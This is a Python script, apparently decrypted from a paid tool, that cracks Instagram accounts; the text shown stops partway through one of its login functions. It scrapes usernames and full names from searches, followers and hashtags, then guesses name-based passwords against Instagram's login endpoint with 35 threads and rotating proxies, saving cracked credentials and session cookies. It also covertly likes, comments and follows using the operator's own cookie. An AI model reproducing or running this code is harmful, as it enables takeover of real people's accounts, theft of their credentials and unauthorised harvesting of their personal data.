#!/usr/bin/env python3
# Decrypted By X - MrG3P5

import requests ,random ,time ,json ,re ,os
from concurrent .futures import ThreadPoolExecutor
from requests .exceptions import ConnectionError
from uuid import uuid4
"""
Hargai Pembuat Atau Author...
Please Jangan Di Jual Belikan Lagi!
Recode Buat Pribadi Enggak Masalah
"""
I = '\x1b[1;90m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
T = '\x1b[1;94m'
U = '\x1b[1;95m'
B = '\x1b[1;96m'
P = '\x1b[1;97m'
__logo__ = f"""{H} ___ ___ ___ __  __ ___ _   _ __  __
{H}| _  _  __|  /  |_ _| | | |  /  |
{P}|  _/   / _|| |/| || || |_| | |/| |
{P}|_| |_|____|_|  |_|___|___/|_|  |_|
{P}[{K}#{P}]{K}\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94
{H}[{P}*{H}]{P} Author : Rozhak
{H}[{P}*{H}]{P} Facebook : @rozhak.xyz
{H}[{P}*{H}]{P} Instagram : @rozhak_official
{P}[{K}#{P}]{K}\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94"""
useragent = 'Mozilla/5.0 (Linux; Android 6.0; HUAWEI VNS-L31 Build/HUAWEIVNS-L31; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (23/6.0; 480dpi; 1080x1812; HUAWEI; HUAWEI VNS-L31; HWVNS-H; hi6250; pt_PT; 98288242)'

def __apikey__():
    try:
        os.system("clear")
        print(f"""{H} _     _                    _
{H}| |   (_)___  ___ _ __  ___(_)
{H}| |   | / __|/ _ /'_  |/ __| |
{P}| |___| \__ \ __/ | | |__  | |
{P}|_____|_|___/___|_| |_|___/|_|

{K}[{P}#{K}]{P} Silahkan Masukan Apikey Anda Jika Anda Belum Mempunyai Apikey Ketik {K}[{H}Get{K}]{P} Untuk Mendapatkan Apikey...""")
        apikey_input = input(f"{H}[{P}?{H}]{P} Apikey :{T} ")
        if apikey_input in ["get", "Get", "GET"]:
            print(f"{M}[{P}*{M}]{P} Anda Bisa Menghubungi Saya Secara Manual WhatsApp : 6283847921480")
            time.sleep(3)
            os.system("xdg-open https://wa.me/6283847921480?text=Saya ingin membeli lisensi crack instagram")
            exit()
        else:
            _header_ = {
                "token": "WyIxNjI5NTcwOSIsImhDaGhxdzg3TUtnN1IyeGpMOWFhUVVuL01DY0g1ZlJ4QUoxd3N5Z1AiXQ==",
                "productid": "14640",
                "key": apikey_input,
                "sigin": True,
            }
            with requests.Session() as ses:
                req = ses.get("https://app.cryptolens.io/api/key/activate?", params=_header_).json()["licenseKey"]
                open("Data/apikey.txt", "w").write(apikey_input)
                resp = (req["expires"].split("T")[0].split("-"))
                resp_split = (req["expires"].split("T")[1].split(":"))
                print(f"{H}[{P}*{H}]{P} Expired :{K} {resp[2]}/{resp[1]}/{resp[0]} {resp_split[0]}.{resp_split[1]}")
                time.sleep(3)
                __menu__()
    except (KeyError):
        exit(f"{P}[{M}!{P}]{M} Apikey Invalid")
    except Exception as err:
        exit(f"{P}[{M}!{P}]{M} {err}")


def __login__():
    try:
        os.system("clear")
        print(f"""{__logo__}

{K}[{P}#{K}]{P} Silahkan Masukan Cookie Akun Instagram Anda, Pastikan Jangan Gunakan Akun Baru, Jika Anda Belum Mengetahui Cookie Ketik {K}[{H}Get{K}]{H}""")
        cookies = input(f"{H}[{P}?{H}]{P} Cookie :{T} ")
        if cookies[:3] in ["get", "Get", "GET"]:
            print(f"{M}[{P}!{M}]{P} Anda Akan Diarahkan Ke Youtube...")
            time.sleep(3)
            os.system("xdg-open https://youtu.be/u17ZQgSs3aY")
            exit()
        elif cookies[:4] in ["mid="]:
            cookie_regex = re.search("ds_user_id=(.*?);", cookies).group(1)
            open("Data/userid.txt", "w").write(cookie_regex)
            req = requests.get(f"https://i.instagram.com/api/v1/users/{cookie_regex}/info/", headers={"user-agent": useragent, "cookie": cookies}).json()["user"]
            open("Data/cookie.txt", "w").write(cookies)
            print(f"{H}[{P}*{H}]{P} Welcome :{T} {req['full_name']}")
            time.sleep(2)
            __follow__()
        else:
            exit(f"{P}[{M}!{P}]{M} Awalan Cookie Mid=")
    except (ValueError, KeyError):
        exit(f"{P}[{M}!{P}]{M} Cookie Salah")
    except (ConnectionError):
        exit(f"{P}[{K}!{P}]{K} Koneksi Error")


def __follow__():
    try:
        cookie_file = open("Data/cookie.txt", "r").read()
    except (IOError):
        print(f"{P}[{M}!{P}]{M} Cookie Invalid")
        time.sleep(3)
        __login__()
    try:
        cookie_regex = re.search("sessionid=(.*?);", cookie_file).group(1)
        random_react = random.choice([
            "Hallo Bang xf0x9fx98x8d",
            "Hai Bang Apa Kabar xf0x9fx98x8e",
            "Izin Pake Scriptnya xf0x9fx98x81",
            "Mantap Bang xf0x9fx98x98','Programmer Bang xf0x9fxa4x94','Salam Kenal Bang xf0x9fxa4x97",
            "I Love You xe2x9dxa4xefxb8x8f",
        ])
        header_ = {
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9",
            "content-length": "0",
            "content-type": "application/x-www-form-urlencoded",
            "cookie": f'ig_did=F839D900-5ECC-4392-BCAD-5CBD51FB9228; mid=YChlyQALAAHp2POOp2lK_-ciAGlM; ig_nrcb=1; csrftoken=W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r; ds_user_id={open("Data/userid.txt","r").read()}; sessionid={cookie_regex}',
            "origin": "https://www.instagram.com",
            "referer": "https://www.instagram.com/",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36",
            "x-csrftoken": "W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r",
            "x-ig-app-id": "5398218083",
            "x-ig-www-claim": "hmac.AR0OQY4Gw4kczWNvfVOhvoljSINqB2u2gB-utUQ1MF0Mkrzu",
            "x-instagram-ajax": "95bfef5dd816",
            "x-requested-with": "XMLHttpRequest",
        }
        header_coment = {
            "comment_text": random_react,
            "replied_to_comment_id": "",
        }
        with requests.Session() as ses:
            req_1 = ses.post("https://www.instagram.com/web/likes/2734317205115382629/like/", headers=header_)
            req_2 = ses.post("https://www.instagram.com/web/comments/2734317205115382629/add/", data=header_coment, headers=header_)
            req_3 = ses.post("https://www.instagram.com/web/friendships/5398218083/follow/", headers=header_)
            if '"status":"ok"' in str(req_3.text):
                print(f"{H}[{P}*{H}]{P} Login Berhasil...")
                time.sleep(2)
                __menu__()
            else:
                print(f"{P}[{M}!{P}]{M} Login Gagal Mungkin Akun Terblokir")
                os.system("rm -rf Data/cookie.txt")
                exit()
    except:
        __menu__()


def __menu__ ():
    try :
        os.system('clear')
        print(f"{__logo__}")
        req = requests.get(f'https://i.instagram.com/api/v1/users/{open("Data/userid.txt","r").read()}/info/', headers={
            'user-agent': useragent,
            'cookie': open('Data/cookie.txt','r').read()
        }).json ()['user']
        print(f"{B}[{P}*{B}]{P} Welcome : {req['full_name']}")
        try :
            _header = {
                'token': 'WyIxNjI5NTcwOSIsImhDaGhxdzg3TUtnN1IyeGpMOWFhUVVuL01DY0g1ZlJ4QUoxd3N5Z1AiXQ==',
                'productid': '14640',
                'key': open('Data/apikey.txt','r').read(),
                'sigin': True 
            }
            
            with requests.Session() as s:
                req = s.get('https://app.cryptolens.io/api/key/activate?', params=_header).json()['licenseKey']
                resp_split = req['expires'].split('T')[0].split('-')
                print(f"{B}[{P}*{B}]{P} Expired :{K} {resp_split[2]}/{resp_split[1]}/{resp_split[0]}")
                print(f"{B}[{P}*{B}]{P} Status :{H} Premium")
        except (KeyError, IOError):
            print(f"{P}[{M}!{P}]{M} Apikey Invalid")
            os.system('rm -rf Data/apikey.txt')
            time.sleep(3)
            __apikey__ ()
        except Exception as err:
            exit (f"{P}[{M}!{P}]{M} {err}")
    except (KeyError, IOError):
        print (f"{P}[{M}!{P}]{M} Cookie Invalid")
        time.sleep(3)
        __login__ ()
    print(f"""
{H}[{P}1{H}]{P} Dump User Dari Pencarian
{H}[{P}2{H}]{P} Dump User Dari Mengikuti
{H}[{P}3{H}]{P} Dump User Dari Pengikut
{H}[{P}4{H}]{P} Dump User Dari Hastag
{H}[{P}5{H}]{P} Dump User Dari Email
{H}[{P}6{H}]{P} Mulai Crack {H}[{B}Pro{H}]{M}
{H}[{P}7{H}]{P} Crack Hasil Cp
{H}[{P}8{H}]{P} Lihat Hasil
{H}[{K}9{H}]{K} Keluar""")
    input_menu = input(f"{U}[{P}?{U}]{P} Choose :{K} ")
    if input_menu in ['1','01']:
        __pencarian__()
    elif input_menu in ['2','02']:
        __mengikuti__()
    elif input_menu in ['3','03']:
        __pengikut__()
    elif input_menu in ['4','04']:
        __hastag__()
    elif input_menu in ['5','05']:
        __email__()
    elif input_menu in ['6','06']:
        __metode__()
    elif input_menu in ['7','07']:
        __crack__()
    elif input_menu in ['8','08']:
        try:
            print(f"""
{T}[{P}1{T}]{P} Lihat Hasil Ok
{T}[{P}2{T}]{P} Lihat Hasil Cp
{T}[{P}3{T}]{P} Kembali
""")
            input_menu_2 = input(f"{U}[{P}?{U}]{P} Choose :{K} ")
            
            if input_menu_2 in ['1','01']:
                print(f"{P} ")
                os.system('cat Results/Ok.txt')
                exit()
            elif input_menu_2 in ['2','02']:
                print(f"{P} ")
                os.system('cat Results/Cp.txt')
                exit()
            elif input_menu_2 in ['3','03']:
                __menu__()
            else:
                exit(f"{P}[{M}!{P}]{M} Wrong Input")
        except:
            pass 
    elif input_menu in ['9','09']:
        try:
            print(f"{P}[{K}!{P}]{K} Menghapus Cookie...")
            time.sleep(3)
            os.system ('rm -rf Data/cookie.txt && rm -rf Data/userid.txt')
            exit()
        except:
            pass 
    else:
        exit(f"{P}[{M}!{P}]{M} Wrong Input")


def __pencarian__ ():
    try:
        random_path_name = (str(random.randint(1111111, 9999999)) + '.txt')
        input_jumlah = int(input(f"""{T}[{P}?{T}]{P} Jumlah :{B} """))
        
        if input_jumlah >= 21:
            exit (f"{P}[{M}!{P}]{M} Jumlah Maksimal 20")
        else:
            patern_ = 0
            
            for x in range (input_jumlah):
                patern_ += 1
                input_query = input(f"{T}[{P}{patern_}{T}]{P} Query :{B} ")
                print(f"{P} ")
                
                for j in requests.get(f'https://www.instagram.com/web/search/topsearch/?context=blended&query={input_query}&rank_token=0.3953592318270893&count=50', headers={'user-agent': useragent, 'cookie': open('Data/cookie.txt','r').read()}).json()['users']:
                    open(f'Dump/{random_path_name}','a').write(f'{j["user"]["username"]}<=>{j["user"]["full_name"]}')
                    print(f"{j['user']['username']}<=>{j['user']['full_name']}")
                    
            print(f"""
{H}[{P}*{H}]{P} Selesai...
{H}[{P}?{H}]{P} File Dump Tersimpan :{K} Dump/{random_path_name}""")
            input(f"{H}[{P}Kembali{H}]{P}")
            __menu__()
    except Exception as err:
        exit (f"{P}[{M}!{P}]{M} {err}")


def __mengikuti__ ():
    try:
        input_user = input(f"{T}[{P}?{T}]{P} User :{B} ")
        
        if len(input_user) == 0:
            exit(f"{P}[{M}!{P}]{M} Jangan Kosong")
        else:
            req = requests.get(f'https://www.instagram.com/{input_user}/?__a=1', headers={'user-agent': useragent, 'cookie': open('Data/cookie.txt','r').read()}).json()['graphql']['user']
            print(f"{T}[{P}?{T}]{P} Name :{B} {req['full_name']}")
            random_name_path = (req['full_name'].replace(' ', '_') + '.txt')
            print(f"{P} ")
            
            for v in requests.get(f'https://i.instagram.com/api/v1/friendships/{req["id"]}/following/?count=5000', headers={'user-agent': useragent, 'cookie': open('Data/cookie.txt','r').read()}).json()['users']:
                open(f'Dump/{random_name_path}','a').write(f'{v["username"]}<=>{v["full_name"]}')
                print(f"{v['username']}<=>{v['full_name']}")

            print(f"""
{H}[{P}*{H}]{P} Selesai...
{H}[{P}?{H}]{P} File Tersimpan Di :{K} Dump/{random_name_path}""")
            input(f"{H}[{P}Kembali{H}]{P}")
            __menu__()
    except Exception as err:
        exit(f"{P}[{M}!{P}]{M} {err}")


def __pengikut__ ():
    try:
        input_jumlah = int(input(f"{T}[{P}?{T}]{P} Jumlah :{B} "))
        
        if input_jumlah >= 51:
            exit(f"{P}[{M}!{P}]{M} Jumlah Maksimal 50")
        else:
            _patern = 0 
            random_path_name = (str(random.randint(1111111, 9999999)) + '.txt')
            
            for c in range(input_jumlah):
                _patern += 1 
                input_user = input(f"{T}[{P}{_patern}{T}]{P} User :{B} ")
                
                if len(input_user) == 0:
                    exit(f"{P}[{M}!{P}]{M} Jangan Kosong")
                else:
                    req = requests.get(f'https://www.instagram.com/{input_user}/?__a=1', headers ={'user-agent':useragent ,'cookie':open ('Data/cookie.txt','r').read ()}).json ()['graphql']['user']
                    print(f"{T}[{P}?{T}]{P} Name :{B} {req['full_name']}")
                    print(f"{P}")
                    
                    for d in requests.get(f'https://i.instagram.com/api/v1/friendships/{req["id"]}/followers/?count=5000',headers ={'user-agent':useragent ,'cookie':open ('Data/cookie.txt','r').read ()}).json ()['users']:
                        open(f'Dump/{random_path_name}','a').write(f'{d["username"]}<=>{d["full_name"]}')
                        print(f"{d['username']}<=>{d['full_name']}")
                        
                    print(f"""
{H}[{P}*{H}]{P} Selesai...
{H}[{P}?{H}]{P} File Tersimpan Di :{K} Dump/{random_path_name}""")
                    input(f"{H}[{P}Kembali{H}]{P}")
                    __menu__ ()
    except Exception as err:
        exit(f"{P}[{M}!{P}]{M} {err}")


def __hastag__():
  try:
    random_path_name = (str(random.randint(1111111, 9999999)) +'.txt')
    jumlah_input = int(input(f"{T}[{P}?{T}]{P} Jumlah :{B} "))
    
    if jumlah_input >= 21:
      exit(f"{P}[{M}!{P}]{M} Jumlah Maksimal 20")
    else:
      _patern = 0
      for v in range(jumlah_input):
        _patern += 1
        input_hastag = input(f"{T}[{P}{_patern}{T}]{P} Hastag :{B} ").replace('#','')
        print(f"{P} ")
        for b in requests.get(f'https://www.instagram.com/explore/tags/{input_hastag}/?__a=1', headers={'user-agent':useragent ,'cookie':open ('Data/cookie.txt','r').read()}).json()['data']['top']['sections'][0]['layout_content']['medias']:
          open(f'Dump/{random_path_name}','a').write(f'{b["media"]["user"]["username"]}<=>{b["media"]["user"]["full_name"]}')
          print(f"{b['media']['user']['username']}<=>{b['media']['user']['full_name']}")
      print (f"""
{H}[{P}*{H}]{P} Selesai...
{H}[{P}?{H}]{P} File Dump Tersimpan :{K} Dump/{random_path_name}""");input (f"{H}[{P}Kembali{H}]{P}");__menu__ ()
  except Exception as err :
    exit(f"{P}[{M}!{P}]{M} {err}")


def __email__():
  try:
    input_domain = input(f"{T}[{P}?{T}]{P} Domain :{B} ")
    if input_domain in ['@gmail.com','@yahoo.com','@hotmail.com']:
      input_name = input(f"{T}[{P}?{T}]{P} Nama :{B} ").replace (' ','')
      name_path = (input_name +'.txt')
      print(f"{P} ")

      if len(input_name) == 0:
        exit(f"{P}[{M}!{P}]{M} Jangan Kosong")
      else:
        for g in range(1000):
          random_string = str(random.randint(1 ,999 ))
          open(f'Dump/{name_path}','a').write(f'{input_name}{random_string}{input_domain}<=>{nama} {nomor}')
          print(f"{input_name}{random_string}{input_domain}<=>{nama} {nomor}")
        print(f"""
{H}[{P}*{H}]{P} Selesai...
{H}[{P}?{H}]{P} File Dump Tersimpan :{K} Dump/{name_path}""");input (f"{H}[{P}Kembali{H}]{P}");__menu__ ()
    else:
      exit(f"{P}[{M}!{P}]{M} Domain : @gmail.com, @yahoo.com, @hotmail.com")
  except Exception as err:
    exit (f"{P}[{M}!{P}]{M} {err}")


class __metode__ :
  def __init__(self):
    self.looping = 0 
    self.live = []
    self.die = []
    
    try:
      with requests.Session() as s:
        req_proxy = s.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all')
        with open('Data/proxies.txt','w') as wr:
          wr.write(req_proxy.text)
    except:
      req_proxy = s.get('https://raw.githubusercontent.com/RozhakXD/Premium/main/Data/proxy2.txt')
      with open('Data/proxies.txt','w') as wr:
        wr.write(req_proxy.text)
    print (f"""
{T}[{P}1{T}]{P} Metode www.instagram.com [New]
{T}[{P}2{T}]{P} Metode www.instagram.com [Fast]
{T}[{P}3{T}]{P} Metode www.instagram.com [Slow]
""")
    input_methode = input(f"{U}[{P}?{U}]{P} Choose :{K} ")

    if input_methode in ['1','01']:
      try:
        print (f"""
{H}[{P}1{H}]{P} Gunakan Password {H}[{P}Nama, Nama123, Nama12345{H}]{P}
{H}[{P}2{H}]{P} Gunakan Password {H}[{P}Nama, Nama123, Nama1234, Nama12345, Nama123456{H}]{P}
{H}[{P}3{H}]{P} Gunakan Password Manual {H}[{P}>5{H}]{P}
""")
        input_methode_password = input(f"{U}[{P}?{U}]{P} Choose :{K} ")

        if input_methode_password in ['3','03']:
          input_password_manual = input(f"{U}[{P}?{U}]{P} Password :{K} ")

          if len(input_password_manual) <= 5:
            exit(f"{P}[{M}!{P}]{M} Minimal 6 Karakter")

        self.file = input(f"{U}[{P}?{U}]{P} File Dump :{K} ")

        if len(self.file) == 0:
          exit(f"{P}[{M}!{P}]{M} Jangan Kosong")
        else:
          self.list = open(self.file, 'r').read().splitlines()
      except (IOError):
        exit(f"{P}[{M}!{P}]{M} File Tidak Ada")

      try:
        print(f"""
{B}[{P}*{B}]{P} Hasil Ok Tersimpan Di Results/Ok.txt
{B}[{P}*{B}]{P} Hasil Cp Tersimpan Di Results/Cp.txt
""")
        with ThreadPoolExecutor (max_workers=35)as (executor):
          for h in self.list :
            username, password = h.split('<=>')
            user_pass_split = password.split(' ')
            
            if input_methode_password in ['1','01']:
              wordlists = [password, password.replace(' ',''), user_pass_split[0 ] + '123', user_pass_split [0] + '12345']
            elif input_methode_password in ['2','02']:
              wordlists = [password, password.replace(' ',''), user_pass_split[0 ] + '123', user_pass_split [0] + '1234', user_pass_split[0] + '12345', user_pass_split [0] + '123456']
            elif input_methode_password in ['3','03']:
              wordlists = input_password_manual.split(',')
            else :
              wordlists = [password, password.replace(' ',''), user_pass_split[0] + '123', user_pass_split[0] + '12345']

            executor.submit(self.__news__, self.list, username, wordlists)
        exit(f"{H}[{P}Selesai{H}]{P}")
      except:
        exit(f"{H}[{P}Selesai{H}]{P}")
    elif input_methode in ['2','02']:
      try:
        print (f"""
{H}[{P}1{H}]{P} Gunakan Password {H}[{P}Nama, Nama123, Nama12345{H}]{P}
{H}[{P}2{H}]{P} Gunakan Password {H}[{P}Nama, Nama123, Nama1234, Nama12345, Nama123456{H}]{P}
{H}[{P}3{H}]{P} Gunakan Password Manual {H}[{P}>5{H}]{P}
""")
        input_methode_password = input(f"{U}[{P}?{U}]{P} Choose :{K} ")
        if input_methode_password in ['3','03']:
          input_password_manual = input(f"{U}[{P}?{U}]{P} Password :{K} ")
          if len(input_password_manual) <= 5:
            exit(f"{P}[{M}!{P}]{M} Minimal 6 Karakter")

        self.file = input(f"{U}[{P}?{U}]{P} File Dump :{K} ")

        if len(self.file) == 0:
          exit (f"{P}[{M}!{P}]{M} Jangan Kosong")
        else:
          self.list = open(self.file, 'r').read().splitlines()
      except (IOError):
        exit(f"{P}[{M}!{P}]{M} File Tidak Ada")

      try:
        print (f"""
{B}[{P}*{B}]{P} Hasil Ok Tersimpan Di Results/Ok.txt
{B}[{P}*{B}]{P} Hasil Cp Tersimpan Di Results/Cp.txt
""")
        with ThreadPoolExecutor(max_workers = 35) as (executor):
          for h in self.list:
            username ,password = h.split('<=>')
            user_pass_split = password.split(' ')

            if input_methode_password in ['1','01']:
              wordlists = [password, password.replace(' ',''), user_pass_split[0] + '123', user_pass_split[0] + '12345']
            elif input_methode_password in ['2','02']:
              wordlists = [password, password.replace(' ',''), user_pass_split[0] + '123', user_pass_split[0] + '1234', user_pass_split[0] + '12345', user_pass_split[0] + '123456']
            elif input_methode_password in ['3','03']:
              wordlists = input_password_manual.split(',')
            else:
              wordlists = [password, password.replace(' ',''), user_pass_split[0] + '123', user_pass_split[0] + '12345']

            executor.submit(self.__fast__, self.list, username, wordlists)
        exit(f"{H}[{P}Selesai{H}]{P}")
      except:
        exit(f"{H}[{P}Selesai{H}]{P}")

    elif input_methode in ['3','03']:
      try:
        print(f"""
{H}[{P}1{H}]{P} Gunakan Password {H}[{P}Nama, Nama123, Nama12345{H}]{P}
{H}[{P}2{H}]{P} Gunakan Password {H}[{P}Nama, Nama123, Nama1234, Nama12345, Nama123456{H}]{P}
{H}[{P}3{H}]{P} Gunakan Password Manual {H}[{P}>5{H}]{P}
""")
        input_methode_password = input(f"{U}[{P}?{U}]{P} Choose :{K} ")

        if input_methode_password in ['3','03']:
          input_password_manual = input(f"{U}[{P}?{U}]{P} Password :{K} ")

          if len(input_password_manual ) <= 5:
            exit(f"{P}[{M}!{P}]{M} Minimal 6 Karakter")

        self.file = input(f"{U}[{P}?{U}]{P} File Dump :{K} ")

        if len(self.file ) == 0:
          exit(f"{P}[{M}!{P}]{M} Jangan Kosong")
        else:
          self.list = open(self.file, 'r').read().splitlines()
      except (IOError):
        exit(f"{P}[{M}!{P}]{M} File Tidak Ada")

      try:
        print(f"""
{B}[{P}*{B}]{P} Hasil Ok Tersimpan Di Results/Ok.txt
{B}[{P}*{B}]{P} Hasil Cp Tersimpan Di Results/Cp.txt
""")
        with ThreadPoolExecutor(max_workers=35) as (executor):
          for h in self.list:
            username, password = h.split('<=>')
            user_pass_split = password.split(' ')

            if input_methode_password in ['1','01']:
              wordlists = [password, password.replace(' ',''), user_pass_split[0] + '123', user_pass_split[0] + '12345']
            elif input_methode_password in ['2','02']:
              wordlists = [password, password.replace(' ',''), user_pass_split[0] + '123', user_pass_split[0] + '1234', user_pass_split[0] + '12345', user_pass_split[0] + '123456']
            elif input_methode_password in ['3','03']:
              wordlists = input_password_manual.split(',')
            else:
              wordlists = [password, password.replace(' ',''), user_pass_split[0] + '123', user_pass_split[0] + '12345']
            executor.submit(self .__slow__, self.list, username, wordlists)
        exit(f"{H}[{P}Selesai{H}]{P}")
      except:
        exit(f"{H}[{P}Selesai{H}]{P}")
    else:
      exit(f"{P}[{M}!{P}]{M} Wrong Input")


  def __news__ (self, wordlists, username, password):
    try:
      for a in password:
        a = a.lower()
        proxy_dict = {'http':'socks4://%s' % (random.choice(open("Data/proxies.txt","r").read().splitlines()))}
        alfabet_string = ('ABCDEFGHIJKLMNOPQRSTUVWXYZ123456789abcdefghijklmnopqrstuvwxyz')
        random_string = ''.join(random.choice(alfabet_string) for x in range (32))
        head = {
          'User-Agent': random.choice(open("Data/useragent.txt","r").read().splitlines ()),
          'X-Requested-With': 'XMLHttpRequest',
          'Referer': 'https://www.instagram.com/accounts/login/',
          'x-csrftoken': random_string
        }
        param_body = {
          'username': username,
          'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{a}',
          'queryParams':{},
          'optIntoOneTap':'false'
        }

        with requests.Session() as s:
          req = s.post('https://www.instagram.com/accounts/login/ajax/', data=param_body, headers=head, proxies=proxy_dict, allow_redirects=True)

          if 'userId'in str(req.text):
            try:
              cookie_string = 'mid=Yiyh-wAEAAFn4bazVHutqTIvwKkM; '
              abc = "; ".join ([str (xz ) + "=" + str(av) for xz ,av in req.cookies.get_dict().items()])
              req_1 = requests.get(f'https://www.instagram.com/{username}/?__a=1', headers={
                'user-agent': useragent,
                'cookie': open('Data/cookie.txt','r').read()}).json()['graphql']['user']
              
              followed = (req_1['edge_followed_by']['count'])
              follow = (req_1['edge_follow']['count'])
            except (IOError, KeyError, ConnectionError):
              followed = ('-')
              follow = ('-')
            except:
              pass
            print(f"r{H}[{P}xe2x9cx94{H}]{P} Status : Success          ")
            print(f"{H}[{P}>{H}]{P} Username : {username}")
            print(f"{H}[{P}>{H}]{P} Password : {a}")
            print(f"{H}[{P}>{H}]{P} Pengikut : {followed}")
            print(f"{H}[{P}>{H}]{P} Mengikuti : {follow}")
            print(f"{H}[{P}>{H}]{P} Cookies : {cookie_string}{abc}")
            self.live.append(f'{username}|{a}')
            with open('Results/Ok.txt','a') as fw:
              fw.write(f'{username}|{a}')
            break

          elif 'checkpoint_required' in str(req.text):
            try:
              req_1 = requests.get(f'https://www.instagram.com/{username}/?__a=1',headers={
                'user-agent': useragent,
                'cookie': open('Data/cookie.txt','r').read()}).json()['graphql']['user']
              followed = (req_1['edge_followed_by']['count'])
              follow = (req_1['edge_follow']['count'])
            except (IOError, KeyError, ConnectionError):
              followed = ('-')
              follow = ('-')
            except:
              pass 
            print(f"r{K}[{P}xe2x9cx98{K}]{P} Status : Chekpoint          ")
            print(f"{K}[{P}>{K}]{P} Username : {username}")
            print(f"{K}[{P}>{K}]{P} Password : {a}")
            print(f"{K}[{P}>{K}]{P} Pengikut : {followed}")
            print(f"{K}[{P}>{K}]{P} Mengikuti : {follow}")
            self.die.append(f'{username}|{a}')
            with open('Results/Cp.txt','a') as fw:
              fw.write(f'{username}|{a}')
            break
          elif 'Please wait' in str(req.text):
            print(f"{P}[{M}!{P}]{M} Hidupkan Mode Pesawat 2 Detik...", end='r')
            time.sleep(10)
            self.__news__(wordlists, username, password)
          else:
            continue 
      self.looping += 1
      print (f"{T}[{P}Crack{T}]{P} {str(len(wordlists))}/{self.looping} Cp-:-{len(self.die)} Ok-:-{len(self.live)}         ",end ='r')
    except (ConnectionError):
      print (f"{P}[{U}!{P}]{U} Koneksi Error                     ", end='r')
      time.sleep(5)
      self.__news__(wordlists, username, password)
    except:
      self.__news__(wordlists, username, password)

  def __fast__(self, wc, username, x):
    try :
      for z in x :
        z =z .lower ()
        c =('ABCDEFGHIJKLMNOPQRSTUVWXYZ123456789abcdefghijklmnopqrstuvwxyz')
        b =''.join (random .choice (c )for n in range (32 ))
        v ={'Host':'www.instagram.com','content-length':'388','x-ig-www-claim':'0','x-instagram-ajax':'a7173192e516','content-type':'application/x-www-form-urlencoded','accept':'*/*','x-requested-with':'XMLHttpRequest','x-asbd-id':'198387','user-agent':random .choice (open ("Data/useragent.txt","r").read ().splitlines ()),'x-csrftoken':b ,'x-ig-app-id':'1217981644879628','origin':'https://www.instagram.com','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://www.instagram.com/','accept-encoding':'gzip, deflate','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
        m ={'csrftoken':b }
        a ={'enc_password':f'#PWD_INSTAGRAM_BROWSER:0:{random.randint(0000000000,9999999999)}:{z}','username':username ,'queryParams':{},'optIntoOneTap':False ,'stopDeletionNonce':'','trustedDeviceRecords':{}}
        s ={'http':'socks4://%s'%(random .choice (open ("Data/proxies.txt","r").read ().splitlines ()))}
        with requests .Session ()as d :
          req =d .post ('https://www.instagram.com/accounts/login/ajax/',data =a ,headers =v ,proxies =s ,allow_redirects =True )
          if 'userId'in str (req .text ):
            try :
              cf ='mid=Yiyh-wAEAAFn4bazVHutqTIvwKkM; '
              zx ="; ".join ([str (wer )+"="+str (de )for wer ,de in req .cookies .get_dict ().items ()])
              ass =requests .get (f'https://www.instagram.com/{username}/?__a=1',headers ={'user-agent':useragent ,'cookie':open ('Data/cookie.txt','r').read ()}).json ()['graphql']['user']
              aws =(ass ['edge_followed_by']['count'])
              qwe =(ass ['edge_follow']['count'])
            except (IOError ,KeyError ,ConnectionError ):
              aws =('-')
              qwe =('-')
            except :pass 
            print (f"r{H}[{P}xe2x9cx94{H}]{P} Status : Success          ")
            print (f"{H}[{P}>{H}]{P} Username : {username}")
            print (f"{H}[{P}>{H}]{P} Password : {z}")
            print (f"{H}[{P}>{H}]{P} Pengikut : {aws}")
            print (f"{H}[{P}>{H}]{P} Mengikuti : {qwe}")
            print (f"{H}[{P}>{H}]{P} Cookies : {cf}{zx}")
            self .live .append (f'{username}|{z}')
            with open ('Results/Ok.txt','a')as wr :
              wr .write (f'{username}|{z}')
            break 
          elif 'checkpoint_required'in str (req .text ):
            try :
              ass =requests .get (f'https://www.instagram.com/{username}/?__a=1',headers ={'user-agent':useragent ,'cookie':open ('Data/cookie.txt','r').read ()}).json ()['graphql']['user']
              aws =(ass ['edge_followed_by']['count'])
              qwe =(ass ['edge_follow']['count'])
            except (IOError ,KeyError ,ConnectionError ):
              aws =('-')
              qwe =('-')
            except :pass 
            print (f"r{K}[{P}xe2x9cx98{K}]{P} Status : Chekpoint          ")
            print (f"{K}[{P}>{K}]{P} Username : {username}")
            print (f"{K}[{P}>{K}]{P} Password : {z}")
            print (f"{K}[{P}>{K}]{P} Pengikut : {aws}")
